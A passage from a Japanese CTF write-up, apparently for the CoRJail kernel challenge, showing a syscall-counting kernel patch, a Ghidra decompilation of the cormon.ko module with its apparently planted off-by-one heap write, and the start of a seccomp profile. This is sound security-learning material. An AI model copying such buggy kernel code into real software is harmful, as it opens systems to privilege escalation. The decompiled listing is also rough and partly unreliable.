&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ __SYSCALL_DEFINEx(x, sname, __VA_ARGS__) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+#define SYSCALL_DEFINE0(sname) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ SYSCALL_COUNT_DECLARE0(sname) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ __SYSCALL_DEFINE0(sname) \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ SYSCALL_COUNT_FUNC0(sname)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(snpped...)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>これは&lt;a href="https://lwn.net/Articles/896474/">procfsにsyscallのanalyticsを追加するパッチ&lt;/a>みたいです。パッチからもわかるように、各CPUに&lt;code>__per_cpu_syscall_count&lt;/code>という変数が追加され、syscallの呼び出し回数を記録するようになっています。&lt;/p>
&lt;h3 id="module-analysis-rev">module analysis (rev)&lt;/h3>
&lt;p>続いて、本問題のメインであるカーネルモジュール(&lt;code>cormon.ko&lt;/code>)を見ていきます。そして気づく、ソースコードが配布されてない！！！きっとおっちょこちょいでソースを配布し忘れてしまったんでしょう。仕方がないのでGhidraで見ていきましょう。デコンパイルして適当に見やすく整形するとこんな感じ:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-decompiled.c" data-lang="decompiled.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>initial_filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> proc_ops cormon_proc_ops &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .proc_open &lt;span style="color:#f92672">=&lt;/span> cormon_proc_open,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .proc_write &lt;span style="color:#f92672">=&lt;/span> cormon_proc_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .proc_read &lt;span style="color:#f92672">=&lt;/span> seq_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> seq_operations cormon_seq_ops &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .start &lt;span style="color:#f92672">=&lt;/span> cormon_seq_start,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .stop &lt;span style="color:#f92672">=&lt;/span> cormon_seq_stop,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .next &lt;span style="color:#f92672">=&lt;/span> cormon_seq_next,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .show &lt;span style="color:#f92672">=&lt;/span> cormon_seq_show,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printk&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;6[CoRMon::Init] Initializing module...&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">proc_create&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;cormon&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0x1B5&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, cormon_proc_ops) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0xC&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">update_filter&lt;/span>(initial_filter) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x16&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printk&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;3[CoRMon::Error] proc_create() call failed!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cormon_proc_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#f92672">*&lt;/span>inode inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">seq_open&lt;/span>(fp, cormon_seq_ops);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">ssize_t&lt;/span> &lt;span style="color:#a6e22e">cormon_proc_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>ubuf, &lt;span style="color:#66d9ef">size_t&lt;/span> size, &lt;span style="color:#66d9ef">loff_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>offset) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">size_t&lt;/span> sz;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>heap;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>offset &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffea&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>offset &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> size &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> size) sz &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xFFF&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> heap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">kmem_cache_alloc_trace&lt;/span>(&lt;span style="color:#f92672">?&lt;/span>, &lt;span style="color:#ae81ff">0xA20&lt;/span>, &lt;span style="color:#ae81ff">0x1000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printk&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;6[CoRMon::Debug] Syscalls @ %#llx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (heap &lt;span style="color:#f92672">==&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printk&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;3[CoRMon::Error] kmalloc() call failed!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0xfffffffffffffff4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">copy_from_user&lt;/span>(heap, ubuf, sz) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printk&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;3[CoRMon::Error] copy_from_user() call failed!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0xfffffffffffffff2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> heap[sz] &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">update_filter&lt;/span>(heap)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">kfree&lt;/span>(heap);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">kfree&lt;/span>(heap);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffea&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">update_filter&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>syscall_str) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>syscall;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> syscall_nr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> syscall_list[&lt;span style="color:#f92672">?&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strsep&lt;/span>(syscall, &lt;span style="color:#e6db74">&amp;#34;,&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> syscall &lt;span style="color:#f92672">!=&lt;/span> NULL &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> syscall_str &lt;span style="color:#f92672">!=&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>((syscall_nr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_syscall_nr&lt;/span>(syscall)) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printk&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;3[CoRMon::Error] Invalid syscall: %s!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, syscall);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0xffffffea&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_list[syscall_nr] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memcpy&lt;/span>(filter, syscall_list, &lt;span style="color:#ae81ff">0x37&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">cormon_seq_show&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> seq_file &lt;span style="color:#f92672">*&lt;/span>sfp, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>vp) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong v &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>vp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (v &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">seq_putc&lt;/span>(sfp, &lt;span style="color:#ae81ff">0xA&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>((n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">cpumask_next&lt;/span>(n, &lt;span style="color:#f92672">&amp;amp;&lt;/span>__cpu_online_mask)) &lt;span style="color:#f92672">&amp;lt;&lt;/span> _nr_cpu_ids) { &lt;span style="color:#75715e">// for_each_cpu macro?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">seq_printf&lt;/span>(sfp, &lt;span style="color:#e6db74">&amp;#34;%9s%d&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;CPU&amp;#34;&lt;/span>, n);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">seq_printf&lt;/span>(sfp, &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">Syscall (NR)&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (filtter[v] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>((name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_syscall_name&lt;/span>(v)) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>((n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">cpumask_next&lt;/span>(n, &lt;span style="color:#f92672">&amp;amp;&lt;/span>__cpu_online_mask)) &lt;span style="color:#f92672">&amp;lt;&lt;/span> _nr_cpu_ids) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">seq_printf&lt;/span>(sfp, &lt;span style="color:#e6db74">&amp;#34;%10sllu&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;CPU&amp;#34;&lt;/span>, __per_cpu_syscall_count[v]); &lt;span style="color:#75715e">// PER_CPU macro?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">seq_printf&lt;/span>(sfp, &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">%s (%lld)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, name, v);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (v &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x1B9&lt;/span>) &lt;span style="color:#a6e22e">seq_putc&lt;/span>(sfp, &lt;span style="color:#ae81ff">0xA&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">cormon_seq_next&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> seq_file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v, &lt;span style="color:#66d9ef">loff_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pos_p) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">loff_t&lt;/span> pos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pos_p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pos_p&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (pos &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1BA&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> pos_p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">cormon_seq_stop&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> seq_file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">cormon_seq_start&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> seq_file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">loff_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pos_p) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>pos_p &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1BA&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> pos_p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>まぁ内容は簡単なのでrev自体はそんなに難しくないです。
やっていることとしては、上述のpatchによって導入されたPERCPUな変数&lt;code>__per_cpu_syscall_count&lt;/code>を表示するインタフェースを作っています。このカウンタはpatchされたsyscallの先頭において&lt;code>__SYSCALL_COUNT()&lt;/code>でインクリメントされます。このインクリメントは、モジュール内の&lt;code>filter&lt;/code>には関係なく全てのsyscallに対して行われます。&lt;code>cormon&lt;/code>モジュールは、&lt;code>proc&lt;/code>に生やしたファイルを&lt;code>read&lt;/code>することで&lt;code>filter&lt;/code>が有効になっているsyscallの統計結果だけを表示しているようにしており、また書き込みを行うことで&lt;code>filter&lt;/code>の値を更新することができるように成っています。&lt;code>update_filter()&lt;/code>を見るとわかるように、更新方法は&lt;code>/proc_rw/cormon&lt;/code>にsyscallの名前をカンマ区切りで書き込みます(Dockerの起動時に&lt;code>-v /proc/cormon:/proc_rw/cormon:rw&lt;/code>としてホストのデバイスファイルをゲストにRWでバインドマウントしています)。
実際に使ってみるとこんな感じ:&lt;/p>
&lt;p>&lt;img src="cj-bull.png" alt="CoROS, actually Debian BullsEye">&lt;/p>
&lt;h3 id="seccomp">seccomp&lt;/h3>
&lt;p>&lt;code>seccomp.json&lt;/code>(のちに&lt;code>corjail.json&lt;/code>としてVM内にコピーされる)には、以下のように&lt;code>defaultAction: SCMP_ACT_ERRNO&lt;/code>でフィルターが設定されています:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-seccomp.json" data-lang="seccomp.json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;defaultAction&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;SCMP_ACT_ERRNO&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;defaultErrnoRet&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;syscalls&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;names&amp;#34;&lt;/span>: [ &lt;span style="color:#e6db74">&amp;#34;_llseek&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;_newselect&amp;#34;&lt;/span>, &lt;span style="color:#960050;background-color:#1e0010">(snipped...)&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;action&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;SCMP_ACT_ALLOW&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;names&amp;#34;&lt;/span>: [ &lt;span style="color:#e6db74">&amp;#34;clone&amp;#34;&lt;/span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;action&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;SCMP_ACT_ALLOW&amp;#34;&lt;/span>,
